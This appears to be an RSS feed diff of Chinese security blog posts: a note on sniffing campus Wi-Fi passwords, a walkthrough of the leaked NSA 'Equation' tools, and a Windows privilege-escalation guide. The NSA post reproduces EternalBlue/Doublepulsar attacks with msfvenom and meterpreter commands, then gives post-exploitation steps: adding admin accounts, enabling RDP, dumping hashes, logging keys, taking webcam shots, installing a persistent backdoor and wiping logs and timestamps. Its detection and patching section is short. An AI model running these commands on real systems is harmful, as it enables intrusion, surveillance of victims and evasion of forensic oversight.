+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于之前买的无线网卡是劣质品无法识别，因此暂无结果。&lt;/p&gt;
+&lt;p&gt;理论上是可以嗅探到的，等成功嗅探后再补发。&lt;/p&gt;
+&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
+&lt;p&gt;参考Freebuf的
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.freebuf.com/articles/network/129721.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;如何在开放无线网络中嗅探校园网密码**&lt;/a&gt;这篇文章提供的python脚本，针对该校的网络进行了一些修改。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>NSA方程式工具利用与分析</title>
+      <link>https://p0st3r.github.io/post/nsa-tools/</link>
+      <pubDate>Fri, 28 Apr 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/nsa-tools/</guid>
+      <description>&lt;h1 id=&#34;shadowbroker&#34;&gt;Shadowbroker&lt;/h1&gt;
+&lt;p&gt;下载地址&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://yadi.sk/d/NJqzpqo_3GxZA4&#34;&gt;https://yadi.sk/d/NJqzpqo_3GxZA4&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解压密码&lt;/strong&gt;：Reeeeeeeeeeeeeee&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;github下载地址&lt;/strong&gt;：
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//github.com/misterch0c/shadowbroker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/misterch0c/shadowbroker&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;释放的工具总共包含三个文件夹，&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。&lt;/li&gt;
+&lt;li&gt;OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional）&lt;/li&gt;
+&lt;li&gt;Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;主要工具&#34;&gt;主要工具&lt;/h1&gt;
+&lt;h2 id=&#34;fuzzbunch一款类似metasploit的exploit框架&#34;&gt;FUZZBUNCH：一款类似Metasploit的Exploit框架&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;模块&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;漏洞&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;影响系统&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;默认端口&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Easypi&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Notes漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows NT, 2000 ,XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;3264&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Easybee&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MDaemon WorldClient电子邮件服务器漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;WorldClient 9.5, 9.6, 10.0, 10.1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalblue&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMBv2漏洞(MS17-010)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Doublepulsar&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalromance&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMBv1漏洞(MS17-010)和 NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalchampion&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalsynergy&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 8, Windows Server 2012&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Explodingcan&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IIS6.0远程利用漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows Server 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;80&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Emphasismine&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IMAP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;143&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Ewokfrenzy&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IMAP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Domino 6.5.4, 7.0.2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;143&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Englishmansdentist&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMTP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;25&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Erraticgopher&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;RPC漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP SP3, Windows 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eskimoroll&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;kerberos漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 2000, 2003, 2003 R2, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;88&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eclipsedwing&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MS08-067漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 2000, XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Educatedscholar&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MS09-050漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows vista, 2008&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Emeraldthread&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Zippybeer&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMTP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Esteemaudit&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;RDP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Windows Server 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;3389&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;eternalblue攻击原理分析&#34;&gt;ETERNALBLUE攻击原理分析&lt;/h2&gt;
+&lt;p&gt;ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞发生处：C:\Windows\System32\drivers\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。&lt;/li&gt;
+&lt;li&gt;漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)&lt;/li&gt;
+&lt;li&gt;触发点：_memmove(v5, (const void &lt;em&gt;)(a2 + 5 +&lt;/em&gt; (_BYTE &lt;em&gt;)(a1 + 5)),&lt;/em&gt; (_WORD *)(a1 + 6));&lt;/li&gt;
+&lt;li&gt;原因：逻辑不正确导致的越界写入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;官方补丁修复前：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;amp;gt; v4))
+    {
+        *(WORD*)v6 = v3 - (_DWORD)v6; //&amp;lt;----------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;amp;gt;= 1) //&amp;lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修复后：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;amp;gt; v4))
+    {
+        *(DWORD*)v6 = v3 - (_DWORD)v6; //&amp;lt;--------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;amp;gt;= 2u) //&amp;lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体见参考资料5&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;环境搭建&lt;/p&gt;
+&lt;p&gt;| 主机类型 | OS | IP |
+| :–: | :————: | :———-: |
+| 攻击机1 | win2003 | 10.10.10.130 |
+| 攻击机2 | kali linux 2.0 | 10.10.10.128 |
+| 靶机 | winXP x86 | 10.10.10.129 |&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;工具准备&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;解压NSA工具包中的windows文件夹到攻击机1的C:\目录下（只要不是中文目录皆可）;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在攻击机1安装:&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//www.python.org/download/releases/2.6.6/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;python-2.6.6.msi**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pywin32-221.win32-py2.6.exe**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在攻击机2先生成用于回连的dll&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll &amp;gt; x86bind.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.扫描开启445端口的活跃主机并探测操作系统&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -Pn -p445 -O 10.10.10.0/24
+nmap -Pn -p445 -O -iL ip.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.攻击机1开始利用ETERNALBLUE攻击&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python fb.py 
+use Eternalblue ...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.利用Doublepulsar注入dll&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;use Doublepulsar
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;6.kali攻击机利用msf回连控制主机5555端口&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LPORT 5555
+set RHOST XXX.XXX.XXX.XXX
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;后渗透攻击&#34;&gt;&lt;strong&gt;后渗透攻击&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;开3389端口&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;wmic /namespace:\root\cimv2\terminalservices path 
+win32_terminalservicesetting where (__CLASS != “”) call 
+setallowtsconnections 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;wmic /namespace:\root\cimv2\terminalservices path 
+win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
+setuserauthenticationrequired 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;针对win XP及win2003只需要第3条命令
+针对win 7需要第1，2条命令
+针对win 2012需要3条命令&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;添加账户进管理组&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;net user [username] [password] /add
+net localgroup Administrators [username] /add
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX
+rdesktop -u root -p toor 127.0.0.1:4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;meterpreter自带的多功能shell&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文&lt;/li&gt;
+&lt;li&gt;screenshot:获取屏幕截图&lt;/li&gt;
+&lt;li&gt;webcam_snap:调取对方摄像头拍照&lt;/li&gt;
+&lt;li&gt;keyscan_start,keyscan_dump:记录键盘动作&lt;/li&gt;
+&lt;li&gt;ps:查看当前运行进程&lt;/li&gt;
+&lt;li&gt;sysinfo:查看系统信息&lt;/li&gt;
+&lt;li&gt;getsystem:提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;维持控制&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;irb client.core.use(&amp;quot;railgun) client.railgun.kernel32.SetThreadExecutionState(&amp;quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;background:隐藏在后台方便msf终端进行其他操作，session查看对话id&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;session -i X:使用已经成功获取的对话&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;植入后门&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;测试是否虚拟机：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;run post/windows/gather/checkvm
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;metsrv.dll
+run metsvc
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;getgui开启远程桌面：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;run getgui -u sherlly -p sherlly
+run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;清除入侵痕迹&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;clearev:清除日志&lt;/li&gt;
+&lt;li&gt;timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;检测防御&#34;&gt;&lt;strong&gt;检测&amp;amp;防御&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址&lt;/p&gt;
+&lt;p&gt;countercept/doublepulsar-detection-script**&lt;/p&gt;
+&lt;p&gt;，使用方法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX
+python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外，nmap也基于该脚本出了对应扫描脚本&lt;/p&gt;
+&lt;p&gt;smb-double-pulsar-backdoor.nse**&lt;/p&gt;
+&lt;p&gt;，使用方法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p 445 &amp;lt;target&amp;gt; --script=smb-double-pulsar-backdoor
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安装相应补丁
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Protecting customers and evaluating risk**&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如非必要，关闭25, 88, 139, 445, 3389端口&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;参考&#34;&gt;&lt;strong&gt;参考&lt;/strong&gt;&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//thehackernews.com/2017/04/swift-banking-hacking-tool.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.freebuf.com/sectool/132029.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客**&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Leaked NSA hacking tools are a hit on the dark web - CyberScoop&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.file.net/process/srv.sys.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;srv.sys Windows process - What is it?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;NSA Eternalblue SMB 漏洞分析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;smb-double-pulsar-backdoor NSE Script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/c843ea0b7d5c7177931e4ab1.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;如何设置Windows 7 防火墙端口规则&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Windows服务器提权和开启3389远程连接</title>
+      <link>https://p0st3r.github.io/post/win-getshell-and-open-rdp/</link>
+      <pubDate>Thu, 20 Apr 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/win-getshell-and-open-rdp/</guid>
+      <description>&lt;p&gt;系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。&lt;/p&gt;
+&lt;p&gt;比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。&lt;/p&gt;
+&lt;p&gt;有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。&lt;/p&gt;
+&lt;p&gt;一般的网站都存储在服务器权限比较低的文件夹里， 所以即使我们上传了WebShell，最多也只能够对网站所在的文件夹操作，而不能完整的控制整个服务器。所以我们需要进行提权，以一个权限相当高的用户来访问该服务器。&lt;/p&gt;
+&lt;p&gt;Windows中以用户组来分配权限，每个用户组有不同的权限，其中最高权限用户组是Administrators组，拥有对整个系统进行操作system权限。每个用户组下可以创建多个用户。&lt;/p&gt;
+&lt;p&gt;在Win10以前的Windows系统版本中，可以通过 右键此电脑=》管理=》系统工具=》本地用户和组来查看用户组及用户组中的用户。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-eb8981064ab46a0bc03f31ee70a86f2b_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x01-大马和菜刀&#34;&gt;0x01 大马和菜刀&lt;/h2&gt;
+&lt;p&gt;我试过各种大马，功能其实都大同小异，不过不知道是不是我使用的原因，里面的cmd并不怎么好用。大马里我个人觉得最有用的就是查看文件权限属性的功能，这个使我们在找后门上传点的时候是非常好用的，并且这个功能在菜刀里是没有的。&lt;/p&gt;
+&lt;p&gt;这种php大马可以在Perms项下看到文件的读写权限属性。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-2fcc71a8ada61d4e72901ab183efe4ec_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;而菜刀比较好的的就是比较适合人类查看的文件目录界面，和虚拟终端。所以通常将两者结合起来用。右键任意可执行文件打开虚拟终端。&lt;/p&gt;
+&lt;h2 id=&#34;imgv2-18be9bbfd3f9c9b66d97b4a376774239_hdpng0x02-巴西烤肉提权&#34;&gt;&lt;img src=&#34;v2-18be9bbfd3f9c9b66d97b4a376774239_hd.png&#34; alt=&#34;img&#34;&gt;0x02 巴西烤肉提权&lt;/h2&gt;
+&lt;p&gt;创建系统用户的命令如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;新建一个用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;net user [username] [password] /add
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;添加到Administrators用户组&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;net localgroup Administrators [username] /add
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;激活用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;net user [username] /active:yes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于一般网站被放在服务器中权限比较低的文件夹中，因此直接创建Administrator用户的命令是不被执行的。&lt;/p&gt;
+&lt;p&gt;巴西烤肉是一个非常强劲的程序，它可以无视拒绝强制执行cmd命令，经常被用到提权中。&lt;/p&gt;
+&lt;p&gt;我们通过菜刀将cmd.exe和巴西烤肉上传到网站文件夹中。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-0d4983673f80086b2a185b50d42e40d5_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后右键cmd.exe打开虚拟终端，先将终端路径设置为我们自己上传的cmd.exe，再尝试直接创建用户，报错命令被拒绝执行。（其实这里是一个Ubuntu Linux服务器）&lt;/p&gt;
